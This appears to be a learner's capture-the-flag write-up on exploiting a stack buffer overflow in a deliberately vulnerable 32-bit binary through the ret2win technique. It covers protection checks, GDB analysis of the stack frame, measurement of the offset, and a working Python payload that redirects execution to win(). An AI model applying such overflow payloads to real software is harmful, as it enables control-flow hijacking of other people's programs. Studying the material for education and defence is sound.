# Ex04: Ret2Win (Stack Buffer Overflow)

---

# Objective

The goal of this exercise is to exploit a **stack buffer overflow** to redirect the program's execution to a hidden function called `win()`.

Unlike the previous exercise (Ex03), where we overwrote a function pointer stored in memory, this challenge introduces one of the most fundamental exploitation techniques:

> **Ret2Win (Return-to-Win)**

Instead of modifying a variable, we overwrite the **saved return address** stored on the stack. When the function finishes and executes the `ret` instruction, the CPU jumps to `win()` instead of returning to the operating system.

---

# Step 1 - Identify the Binary

```bash
file bin
```

Output:

```
ELF 32-bit LSB executable
```

This tells us:

* Architecture: x86 (32-bit)
* Little Endian
* ELF executable

---

# Step 2 - Check Security Protections

```bash
checksec --file=bin
```

Output:

```
RELRO: No RELRO
Canary: No canary found
NX: NX disabled
PIE: No PIE
```

Explanation:

| Protection   | Status   | Meaning                                             |
| ------------ | -------- | --------------------------------------------------- |
| Stack Canary | Disabled | Nothing detects our overflow                        |
| NX           | Disabled | Stack is executable (not needed for this challenge) |
| PIE          | Disabled | Function addresses stay constant                    |
| RELRO        | Disabled | GOT remains writable                                |

This binary is intentionally vulnerable.

---

# Step 3 - Look for Interesting Functions

Display the symbol table:

```bash
readelf -s bin
```

or

```bash
objdump -t bin
```

Important result:

```
080483f4 win
08048408 main
```

The binary contains a hidden function named:

```
win()
```

This is our target.

---

# Step 4 - Search for Strings

```bash
strings bin
```

Output:

```
code flow successfully changed
```

This string is never printed by `main()`, so it likely belongs to `win()`.

---

# Step 5 - Disassemble main()

Inside GDB:

```gdb
disassemble main
```

Result:

```asm
push ebp
mov ebp, esp

and esp,0xfffffff0
sub esp,0x50

lea eax,[esp+0x10]
mov [esp],eax
call gets

leave
ret
```

---

# Understanding Every Instruction

## Function Prologue

```asm
push ebp
mov ebp, esp
```

Creates a new stack frame.

```
Higher addresses
-------------------------
Return Address
Saved EBP
-------------------------
Lower addresses
```

---

## Stack Alignment

```asm
and esp,0xfffffff0
```

Rounds ESP down to a multiple of 16 bytes.

Modern compilers do this before calling library functions.

---

## Reserve Stack Space

```asm
sub esp,0x50
```

Reserve

```
0x50 = 80 bytes
```

for local variables.

---

## Locate the Buffer

```asm
lea eax,[esp+0x10]
```

`lea` means:

> Load Effective Address

It calculates an address without reading memory.

Example:

```
ESP = 0xffffcd60

lea eax,[esp+0x10]

↓

EAX = 0xffffcd70
```

That address is passed to `gets()`.

---

## Pass Argument

```asm
mov [esp],eax
```

Equivalent C:

```c
gets(buffer);
```

Arguments are passed on the stack in x86.

---

## Vulnerability

```asm
call gets
```

`gets()` reads input until Enter.

It never checks the size of the destination buffer.

If we type more data than the buffer can hold, we overwrite whatever comes after it on the stack.

---

# What is `ret`?

The `ret` instruction means:

> Return to the caller.

Internally it does something very simple.

Equivalent pseudo-code:

```asm
EIP = *(ESP)
ESP += 4
```

It pops **4 bytes** from the stack and loads them into the **Instruction Pointer (EIP)**.

Those 4 bytes are called the **saved return address**.

---

## Normal Execution

Suppose:

```
main()
{
    foo();
}
```

Memory:

```
main
|
| call foo
v

foo
```

The CPU executes:

```
call foo
```

Internally:

```
push return_address

jump foo
```

The stack becomes:

```
Return Address
```

Later:

```
ret
```

The CPU pops the return address and continues execution after the `call`.

---

# What is Ret2Win?

Normally:

```
main()

↓

leave

↓

ret

↓

Operating System
```

After overflowing:

```
main()

↓

leave

↓

ret

↓

win()
```

We do **not** call `win()`.

Instead,

we replace the return address so that

```
ret
```

naturally jumps into `win()`.

Hence the name:

```
Return

↓

Win
```

Ret2Win.

---

# Finding the Offset

Initially we guessed:

```
64-byte buffer

+

4-byte saved EBP

=

68
```

But the exploit failed.

So we inspected memory in GDB.

Breakpoint:

```gdb
break *0x0804841d
```

Before executing:

```
leave
```

Dump memory:

```gdb
x/32wx $esp
```

Output:

```
ESP = 0xffffcd60

Buffer starts at

0xffffcd70
```

Current EBP:

```
EBP = 0xffffcdb8
```

Difference:

```
0xffffcdb8
-
0xffffcd70
----------
0x48
```

```
0x48 = 72 bytes
```

Therefore:

```
Buffer

↓

72 bytes

↓

Saved EBP

↓

4 bytes

↓

Return Address
```

Offset:

```
72 + 4 = 76 bytes
```

---

# Finding win()

Inside GDB:

```gdb
disassemble win
```

Result:

```
0x080483f4
```

Little Endian:

```
f4 83 04 08
```

Python:

```python
b"\xf4\x83\x04\x08"
```

---

# Final Payload

```bash
python3 -c 'import sys; sys.stdout.buffer.write(
    b"A"*76 +
    b"\xf4\x83\x04\x08"
)' | ./bin
```

Output:

```
code flow successfully changed
Segmentation fault
```

The segmentation fault occurs because `win()` eventually executes its own `ret`, but since we jumped into `win()` instead of calling it, there is no valid return address waiting on the stack.

The important part is that control flow successfully reached `win()`, completing the challenge.

---

# What I Learned

* How stack frames are created using `push ebp` and `mov ebp, esp`.
* How `leave` restores the previous stack frame.
* How `ret` pops the saved return address into `EIP`.
* Why `gets()` is unsafe and allows stack buffer overflows.
* How to locate hidden functions using `readelf`, `strings`, and `gdb`.
* How to inspect the stack with `x/32wx $esp`.
* Why the real offset must sometimes be measured instead of inferred from the disassembly.
* How little-endian byte order affects exploit payloads.
* The concept of **Ret2Win**, where execution is redirected by overwriting the saved return address instead of calling a function directly.

---

# Key Takeaways

* `call` pushes a return address onto the stack before jumping to a function.
* `ret` pops that address into `EIP` and continues execution there.
* A stack overflow can overwrite the saved return address.
* **Ret2Win** is the simplest form of control-flow hijacking and the foundation for more advanced techniques such as **ROP (Return-Oriented Programming)**.
* When the goal is simply to execute a hidden function, a segmentation fault afterward is often expected because the overwritten call stack is no longer valid.
